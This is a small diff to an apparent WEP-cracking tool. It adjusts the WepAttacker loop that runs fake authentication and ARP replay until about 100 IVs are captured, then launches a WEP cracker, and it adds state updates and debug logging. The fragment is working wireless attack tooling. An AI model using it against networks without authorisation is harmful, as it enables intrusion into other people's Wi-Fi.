@@ -642,12 +642,19 @@ class WepAttacker(object):
                     logger.debug('fakeauth: 5 s backoff')
                     time.sleep(5)
                     fake_authentication.start()
+                time.sleep(1)
 
             arp_replay = ArpReplay(interface=self.monitoring_interface, ap=self.ap)
             arp_replay.start(source_mac=self.monitoring_interface.mac_address)
 
             # some time to create capture capturer.capturing_cap_path
-            while capturer.get_iv_sum() < 100:
+            while int(capturer.get_iv_sum()) < 100:
+                fake_authentication.update_state()
+                arp_replay.update_state()
+                logger.debug('FakeAuthentication: ' + str(fake_authentication.state) + ', ' +
+                             'flags: ' + str(fake_authentication.flags)
+                             )
+                logger.debug(arp_replay)
                 time.sleep(1)
 
             cracker = WepCracker(cap_filepath=capturer.capturing_cap_path, ap=self.ap)
